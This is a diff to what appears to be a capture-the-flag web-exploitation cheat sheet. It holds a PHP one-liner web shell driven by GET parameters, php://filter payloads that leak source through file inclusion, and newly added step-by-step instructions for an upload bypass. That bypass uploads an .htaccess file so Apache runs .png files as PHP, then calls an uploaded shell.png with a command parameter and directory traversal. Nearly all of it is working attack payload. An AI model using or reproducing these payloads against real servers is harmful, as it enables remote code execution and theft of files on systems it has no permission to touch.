@@ -11,6 +11,13 @@
 # Obfuscated system execution
 <?php $_GET['func']($_GET['arg']); ?>
 
+# .htaccess -> make Apache execute an allowed image ext as PHP (upload BOTH to upload dir)
+# Step 1) upload file named ".htaccess" containing:
+#     AddType application/x-httpd-php .png
+#   (alt) <FilesMatch "\.png$">\nSetHandler application/x-httpd-php\n</FilesMatch>
+# Step 2) upload a "shell.png" containing PHP (e.g. the system() line above)
+# Step 3) request /uploads/shell.png?c=<cmd>, use ../.. to escape web root for flag.
+
 # PHP filter extraction (for inclusion challenges)
 php://filter/convert.base64-encode/resource=index.php
 php://filter/read=string.rot13/resource=index.php
